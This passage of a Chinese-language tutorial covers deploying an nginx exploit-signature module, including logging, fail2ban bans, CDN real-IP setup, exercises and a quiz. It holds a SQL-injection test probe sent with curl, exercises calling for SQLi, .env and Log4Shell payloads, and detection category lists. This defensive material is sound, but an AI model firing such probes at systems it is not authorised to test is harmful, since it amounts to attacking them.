#   ★★★ 在 detect 模式下測試（★ 不影響服務）
$ sudo sed -i 's/shield block;/shield detect;/' /etc/nginx/conf.d/shield.conf
$ sudo nginx -t && sudo systemctl reload nginx

# 【5】★★★ 封鎖狀態
$ curl -s http://127.0.0.1/shield-status | jq .
$ sudo nginx -T | grep -A2 shield_ban

# 【6】★★★★ 真實 IP 是否正確
$ sudo tail -20 /var/log/nginx/shield.json | jq -r '.ip' | sort -u
#   ★★★★ 都是同一個內部 IP = real_ip 沒設對
$ sudo nginx -T | grep -E 'set_real_ip_from|real_ip_header'

# 【7】★★★ 4xx 比率的趨勢
$ for d in 0 1 2 3 4 5 6; do
    date_str=$(date -d "-$d days" '+%d/%b/%Y')
    total=$(grep -c "$date_str" /var/log/nginx/app-access.log* 2>/dev/null | \
            awk -F: '{s+=$2} END{print s+0}')
    f403=$(grep "$date_str" /var/log/nginx/app-access.log* 2>/dev/null | \
           grep -c ' 403 ' || echo 0)
    awk -v d="$date_str" -v t="$total" -v f="$f403" \
      'BEGIN{printf "%s  總計=%7d  403=%6d  (%.2f%%)\n", d, t, f, (t>0? f/t*100 : 0)}'
  done
```

---

## 安全性注意事項

> [!danger] 五個要點 ★★★★
> ```
> ① ★★★★ shield 不是完整的防護
>      → ★★★ 它擋的是【已知的漏洞利用】
>      → ★★★★ 應用層的邏輯漏洞、認證繞過、業務邏輯攻擊【擋不住】
>      → ★★★ 不能因為裝了 shield 就放鬆應用程式的安全
>
> ② ★★★★ 先 detect 再 block
>      → ★★★ 直接 block 可能擋掉正常使用者
>      → 至少觀察一週
>
> ③ ★★★★ CDN/LB 後面一定要設 real_ip
>      → 否則封鎖的是 CDN 的 IP = 封鎖所有人
>
> ④ ★★★ 狀態端點要限制存取
>      → 暴露封鎖數量與追蹤的 IP 數
>
> ⑤ ★★★ 命中日誌含完整的請求列
>      → ★★★★ 可能含 token、session、密碼（★ 攻擊者測試用的）
>      → chmod 640，不要放在 web 可存取的路徑
> ```

```bash
# ★★★★ 日誌的保護
$ sudo chmod 640 /var/log/nginx/shield.json
$ sudo chown www-data:adm /var/log/nginx/shield.json

# ★★★ 確認日誌不在 web root
$ sudo nginx -T | grep -oP '^\s*root\s+\K\S+' | tr -d ';' | sort -u | while read -r r; do
    [ -e "$r/shield.json" ] && echo "★★★★ 日誌在 web root！: $r/shield.json"
  done
$ curl -sko /dev/null -w '%{http_code}\n' https://app.example.gov.tw/shield.json
404                                        # ★★★ 正確

# ★★★ 檢查日誌中的敏感資料
$ sudo jq -r '.req' /var/log/nginx/shield.json | \
    grep -iE 'password=|token=|api[_-]?key=|authorization' | head
#   ★★★★ 有的話要考慮遮蔽或縮短保留期限

# ★★ logrotate
$ sudo tee /etc/logrotate.d/nginx-shield >/dev/null <<'EOF'
/var/log/nginx/shield.json {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
    create 0640 www-data adm
    sharedscripts
    postrotate
        [ -f /run/nginx.pid ] && kill -USR1 "$(cat /run/nginx.pid)"
    endscript
}
EOF

# ★★★★ 白名單重要的來源（★ 避免誤封）
$ sudo tee /etc/nginx/conf.d/shield-allowlist.conf >/dev/null <<'EOF'
# ★★★ 內部網段與重要客戶不做封鎖
geo $shield_exempt {
    default 0;
    10.10.20.0/24 1;              # ★ 內網
    203.0.113.0/28 1;             # ★★ 重要的合作機關
}
EOF
#   ★★★ 在 location 中依變數決定（★ 實際語法請對照官方文件）

# ★★★ 把 shield 的封鎖同步給 fail2ban（★ 持久化 + 遞增封鎖）
$ sudo tee /etc/fail2ban/filter.d/nginx-shield.conf >/dev/null <<'EOF'
[Definition]
# ★★★ 比對 shield 的 JSON 日誌
failregex = ^\{.*"ip"\s*:\s*"<HOST>".*"mode"\s*:\s*"block".*\}$
ignoreregex =
EOF

$ sudo tee /etc/fail2ban/jail.d/nginx-shield.conf >/dev/null <<'EOF'
[nginx-shield]
enabled  = true
filter   = nginx-shield
logpath  = /var/log/nginx/shield.json
maxretry = 10
findtime = 300
bantime  = 3600
bantime.increment = true          # ★★★ 累犯遞增
bantime.factor = 2
bantime.maxtime = 604800          # ★★ 最長一週
action   = nftables-multiport[name=shield, port="http,https"]
ignoreip = 127.0.0.1/8 10.10.20.0/24
EOF

$ sudo systemctl restart fail2ban
$ sudo fail2ban-client status nginx-shield
```

---

## 速查表

### ★★★★ shield 不是 WAF

```
★★★ 定位：「誤判率接近零的、針對舊漏洞利用的防護地板」
★★★★ 編譯進去的 656 個固定特徵，單次 Aho-Corasick 掃描（約 1µs）
★★★★ 不取代 ModSecurity，兩者互補
```

### 指令

```nginx
shield off|detect|block             ★★★★ 模式（http/server/location）
shield_body on|off                  ★★★ 檢查請求本體
shield_max_body 8k                  ★★★ 掃描的位元組數
shield_status 403                   403/404/419/429/444
shield_skip sqli xss                ★★★★ 停用分類（空白分隔）
shield_log /var/log/nginx/shield.json
shield_ban_zone shield:10m          ★★★ (http)
shield_ban zone=shield count=5 window=1m bantime=1h
shield_ban_status shield            ★★ (location) JSON 狀態端點
```

### ★★★★ 上線流程

```
第 1 週  shield detect;             ★★★★ 只記錄不阻擋
第 2 週  分析日誌 → shield_skip     處理誤判
第 3 週  shield block;              ★★★ 低流量時段開始
第 4 週  加上 shield_ban            ★★ 保守參數：count=10 window=1m bantime=10m
```

### 重要分類

```
sensitive_file  ★★★★ .env / .git 等
sqli            ★★★★ SQL 注入
log4shell       ★★★★ JNDI 注入
exploit_path    ★★★ 已知 CVE 端點
traversal       ★★★ 路徑穿越
php_rce / cmdi  ★★★ 遠端執行
webshell        ★★★ webshell 檔名
ssrf_meta       ★★★★ 雲端 metadata
shellshock      ★★★ bash 函式漏洞
```

### ★★★ 誤判處理（由精準到寬鬆）

```
① ★★★★ 修正應用程式（根本解法）
② ★★★ location /legacy/ { shield_skip sqli; }
③ ★★ location /upload { shield_body off; }
④ ★ 全域 shield_skip xss;
★★★★ 絕對不要：遇到誤判就 shield off
```

### ★★★★ CDN/LB 後面

```nginx
set_real_ip_from 10.10.20.0/24;
real_ip_header X-Forwarded-For;      # ★ 或 CF-Connecting-IP
real_ip_recursive on;
★★★★ 沒設的話會封鎖 CDN 的 IP = 封鎖所有使用者！
驗證：jq -r '.ip' shield.json | sort -u
```

### ★★★ 排錯

```bash
sudo nginx -T | grep -E 'load_module.*shield|shield '
sudo jq -r '.cat' /var/log/nginx/shield.json | sort | uniq -c | sort -rn
sudo jq -c 'select(.ip=="203.0.113.45")' shield.json | tail
curl -sI "https://d/?q=1'+or+1=1--"        # ★★★ 測試（應該 403）
curl -s http://127.0.0.1/shield-status | jq .
shield-analyze /var/log/nginx/shield.json 7    # ★★★★ 誤判分析
```

---

## 練習題

> [!question]- 練習 1：detect 模式 ★★★
> 1. **設定 `shield detect` 與 `shield_log`**
> 2. **送幾個測試 payload**（SQLi / .env / Log4Shell）
> 3. **`jq .` 看命中記錄** → 有哪些欄位？
> 4. **請求有被擋嗎？狀態碼是多少？**
> 5. **`shield_skip sqli` 之後再測** → 呢？
> 6. **對照 access.log** → 兩份日誌怎麼關聯？

> [!question]- 練習 2：分析誤判 ★★★★
> 1. **在 detect 模式跑一週（或用測試流量模擬）**
> 2. **執行 `shield-analyze`**
> 3. **哪些分類的「平均次數/IP」偏低？**
> 4. **這代表什麼？**
> 5. **挑一個疑似誤判的，看實際的請求內容**
> 6. **決定要 `shield_skip` 還是修應用程式**

> [!question]- 練習 3：block 與封鎖 ★★★★
> 1. **改成 `shield block`，用 payload 測試** → 回什麼狀態碼？
> 2. **設定 `shield_ban count=3 window=1m bantime=5m`**
> 3. **連送 5 個 payload** → 第幾次被封鎖？
> 4. **被封鎖後送正常請求** → 也被擋嗎？
> 5. **`curl /shield-status`** → banned 是多少？
> 6. **`systemctl reload nginx`** → 封鎖清單還在嗎？為什麼？

> [!question]- 練習 4：CDN 後面 ★★★★
> 1. **用 nginx 當前面的反向代理模擬 CDN**
> 2. **不設 `real_ip_header`，觸發 shield** → 日誌中的 `ip` 是誰？
> 3. **設定 `set_real_ip_from` + `real_ip_header`** → 呢？
> 4. **設定 `shield_ban` 並在代理後面觸發** → 封鎖了誰？
> 5. **這代表什麼災難？**
> 6. **寫一個驗證真實 IP 是否正確的檢查**

> [!question]- 練習 5：和 ModSecurity 搭配 ★★★
> 1. **同時啟用 shield 和 ModSecurity**
> 2. **送一個 SQLi payload** → 誰先擋下來？
> 3. **`shield off` 之後再送** → ModSecurity 擋得住嗎？
> 4. **比較兩者的日誌**
> 5. **用 `perf stat` 比較 CPU 開銷**
> 6. **靜態資源的 location 兩個都關 → 效能差多少？**

---

## 小測驗

Q1. **shield 和 ModSecurity 的五個差異**？為什麼說 shield 不是 WAF？

Q2. **shield 為什麼可以「幾乎免費」地開著**？

Q3. **三種模式的差別**？上線該用什麼順序？

Q4. **`detect` 模式會影響服務嗎**？為什麼？

Q5. **怎麼從日誌判斷「這是攻擊還是誤判」**？

Q6. **處理誤判的四種方式**？優先順序？

Q7. **在 CDN 後面沒設 `real_ip_header` 會發生什麼災難**？

Q8. **`shield_ban` 的三個參數怎麼選**？NAT 環境要注意什麼？

Q9. **reload 之後封鎖清單消失，這是 bug 嗎**？要持久化怎麼辦？

Q10. **裝了 shield 之後，應用程式的安全還需要注意什麼**？

> [!question]- 測驗答案
> **Q1.** **五個差異**：
> ①**規則機制** —— ModSecurity 有**規則語言 + 正規表示式引擎**（可完全自訂），
> shield 是**編譯進去的 656 個固定特徵**（只能停用分類）；
> ②**★★★★ 效能** —— ModSecurity **每個請求要跑數百條 regex**（CPU 開銷明顯），
> shield 用**單次 Aho-Corasick 掃描，約 1µs**，複雜度與特徵數無關；
> ③**★★★★ 誤判率** —— ModSecurity + CRS 誤判高、要長期調校，
> shield **誤判接近零**；
> ④**涵蓋範圍** —— ModSecurity 廣（含未知攻擊模式），shield 窄（已知的漏洞利用）；
> ⑤**學習曲線** —— ModSecurity 陡，shield 平緩。
> **★★★★ 說它不是 WAF 是因為它「沒有規則語言、沒有 regex 引擎」** ——
> 官方定位是「**誤判率接近零的、針對舊漏洞利用的防護地板**」，
> **它不取代 WAF，兩者互補**。
>
> **Q2.** 因為 **它用單次 Aho-Corasick 掃描，複雜度是 O(位元組數)，和特徵數量無關**。
> Aho-Corasick 把 **656 個特徵編譯成一個有限狀態機**，
> 掃描緩衝區一次就**同時比對所有特徵**，
> 典型的 URI 大約 1 微秒。
> **對照 ModSecurity**：每條規則跑一次正規表示式，
> CRS 有數百條規則 → **每個請求跑數百次 regex**，
> 高流量時 CPU 開銷非常明顯。
> **所以 shield 可以放心在所有 location 開著** ——
> 除了純靜態資源（`.css`/`.js`/圖片）可以 `shield off` 再省一點，
> 但即使不關也不會有感。
> 這也是為什麼「shield 在前擋掉大量掃描 + ModSecurity 在後做深度檢測」
> 是很好的組合 —— shield 幫 ModSecurity 大幅減輕負擔。
>
> **Q3.** **`off`** = 完全不檢查（預設）；
> **★★★★ `detect`** = **只記錄不阻擋** ——
> 請求正常放行，命中的記錄寫進 `shield_log`；
> **`block`** = 命中就回 `shield_status` 指定的狀態碼（預設 403）。
> **★★★★ 上線順序**：
> **第 1 週 `detect`**（記錄所有命中，完全不影響服務）→
> **第 2 週分析日誌處理誤判**（`shield_skip`）→
> **第 3 週 `block`**（先在低流量時段，密切監控 403 比率）→
> **第 4 週加上 `shield_ban`**（保守參數起步）。
> **絕對不要一開始就 `block`** —— 誤判會直接擋掉正常使用者，
> 而你在事前完全不知道自己的應用程式會不會誤判。
>
> **Q4.** **★★★ 不會**。
> `detect` 模式下 shield **只做掃描並記錄，請求一律正常放行** ——
> 日誌中的 `status` 會是應用程式實際回應的狀態碼（例如 200），
> `mode` 欄位是 `detect`。
> **而且 detect 模式是 fail-open**：
> 萬一檢查本身失敗（記憶體不足等），會**記錄並放行**；
> 對照 `block` 模式是 **fail-safe** —— 檢查失敗時回 500。
> **唯一的影響是極小的 CPU 開銷**（約 1µs/請求）和日誌檔的磁碟空間。
> **所以 detect 模式可以放心在正式環境開啟**，
> 這正是它的用途：**在不影響服務的前提下收集資料，判斷開啟 block 是否安全**。
>
> **Q5.** **★★★★ 看「平均命中次數 / 每個 IP」**：
> ```
> sensitive_file  2840 次 /   8 個 IP  (平均 355 次/IP)  ✓ 像是攻擊
> xss               42 次 /  38 個 IP  (平均 1.1 次/IP)  ★★★★ 疑似誤判
> ```
> **攻擊的特徵**：**少數 IP、大量命中** ——
> 自動化掃描工具會對同一個目標打幾百上千次。
> **誤判的特徵**：**大量不同的 IP、每個只命中 1~2 次** ——
> 這表示命中分散在**許多正常使用者**身上，
> 很可能是應用程式的正常參數被誤判了。
> **其他判斷依據**：
> ①**看實際的請求內容**（`.req` 欄位）—— 是明顯的 payload 還是正常的業務參數；
> ②**看命中的路徑** —— 集中在某個特定的 API 端點通常是誤判；
> ③**看 `src` 欄位** —— 命中在 body 且集中在富文本編輯器的端點，多半是誤判；
> ④**對照 access.log** —— 那個 IP 的其他請求看起來像正常使用嗎。
>
> **Q6.** **由精準到寬鬆的四種方式**：
> ①**★★★★ 修正應用程式**（根本解法）——
> 誤判常常是因為應用程式的設計不好（例如把 SQL 片段當 URL 參數傳），
> 改掉之後不只解決誤判，本身也更安全；
> ②**★★★ 在特定 location 停用特定分類**：
> `location /legacy/ { shield_skip sqli; }` —— **影響範圍最小**；
> ③**★★ 在特定 location 關掉本體檢查**：
> `location /api/upload { shield_body off; }`；
> ④**★ 全域停用該分類**：`shield_skip xss;` —— **影響範圍最大，最後才用**。
> **★★★★ 絕對不要做的**：遇到誤判就 `shield off;` ——
> 那等於把整個防護關掉，白裝了。
>
> **Q7.** **★★★★ 封鎖 CDN 的 IP = 封鎖所有使用者**。
> 在 CDN 或反向代理後面，nginx 看到的 `$remote_addr` 是**CDN 節點的 IP**，
> 不是真實的客戶端。
> 如果沒設 `real_ip_header`：
> ①**shield 日誌中所有命中的 `ip` 都是同一個（CDN 的 IP）**；
> ②`shield_ban` 會很快累積到觸發條件（因為所有人的請求都算在同一個 IP 上）；
> ③**觸發封鎖後，通過那個 CDN 節點的所有使用者全部被擋**。
> **正確設定**：
> ```nginx
> set_real_ip_from 173.245.48.0/20;      # ★ CDN 的網段
> real_ip_header CF-Connecting-IP;        # ★★★ 或 X-Forwarded-For
> real_ip_recursive on;
> ```
> **驗證**：`jq -r '.ip' /var/log/nginx/shield.json | sort -u` ——
> 如果都是同一個內部 IP 就是沒設對。
>
> **Q8.** **`count`（觸發次數）** ——
> 太小（1~2）**誤判時會直接封鎖正常使用者**；
> 太大（50+）攻擊者可以打很久。**建議 5~10**。
> **`window`（計數時間窗）** ——
> `1m` 適合擋自動化掃描（它們打很快），
> `10m` 適合擋比較慢的探測。
> **`bantime`（封鎖時長）** ——
> **第一次 1h 就好**，太長的話誤判的影響很大。
> **累犯的遞增封鎖交給 fail2ban** 處理（它支援 `bantime.increment`）。
> **★★★★ NAT 環境的注意事項**：
> **一個公司、學校、或整棟大樓可能共用一個對外 IP** ——
> 一個人觸發就**整個組織被封鎖**。
> **對策**：`count` 設高一點（10~20）、
> **重要合作單位的 IP 加白名單**、
> `bantime` 不要太長、
> 監控封鎖清單看有沒有誤封。
> **保守的起手式**：`count=10 window=1m bantime=10m`。
>
> **Q9.** **★★★ 不是 bug，是正常的設計**，而且**這其實是好事**。
> 封鎖狀態存在 **`shield_ban_zone` 定義的共享記憶體區**，
> nginx reload 或重啟時共享記憶體會重新初始化，封鎖清單自然清空。
> **為什麼是好事**：**誤判造成的封鎖有一個自然的上限** ——
> 最糟的情況下，reload 一次就解除了，
> 不會有「某個正常使用者被永久封鎖但沒人發現」的問題。
> **要持久化與遞增封鎖的話用 fail2ban**：
> ```ini
> [nginx-shield]
> logpath  = /var/log/nginx/shield.json
> failregex = ^\{.*"ip"\s*:\s*"<HOST>".*"mode"\s*:\s*"block".*\}$
> bantime.increment = true          # ★★★ 累犯遞增
> bantime.maxtime = 604800
> action = nftables-multiport[name=shield, port="http,https"]
> ignoreip = 127.0.0.1/8 10.10.20.0/24
> ```
> 這樣封鎖寫進防火牆規則（跨 reload 保留），而且累犯的封鎖時間會遞增。
>
> **Q10.** **★★★★ shield 只擋「已知的漏洞利用」，擋不住的東西還很多**：
> ①**★★★★ 應用層的邏輯漏洞** ——
> 越權存取（改 URL 的 id 就看到別人的資料）、
> 業務邏輯繞過（負數金額、重複提交）、競態條件；
> ②**★★★ 認證與授權缺陷** ——
> 弱密碼、session 固定、JWT 驗證不完整、
> Filament 的 `canAccessPanel` 預設允許任何登入者；
> ③**★★★ 針對你的應用程式客製的攻擊** ——
> shield 的特徵是「已知的通用 payload」，
> 攻擊者針對你的程式碼寫的 payload 不在特徵庫裡；
> ④**★★ 資料外洩** —— 錯誤訊息洩漏、debug 模式沒關、
> `.env` 放在 web root（★ shield 擋得住存取，但檔案不該在那裡）；
> ⑤**★★ 供應鏈與相依套件的漏洞**。
> **★★★★ 所以「裝了 shield 就放鬆應用程式安全」是最危險的心態** ——
> 它是**縱深防禦的一層**，不是唯一的一層。
> 應用程式的安全檢查（見 [[07-Laravel-正式環境安全檢查表]]）一樣要做。

---

## 延伸閱讀

- [[01-MyGuard套件庫介紹]] — 套件庫與模組安裝
- [[05-error-abuse與sentinel]] — **★★★ 限流與信譽評分**
- [[01-WAF概念與ModSecurity安裝]] — **★★★ 完整 WAF（互補）**
- [[09-Nginx-安全設定]] — NGINX 的安全基礎
- [[07-Laravel-正式環境安全檢查表]] — 應用層的安全
- [[08-MyGuard實戰組合]] — 完整的實戰配置
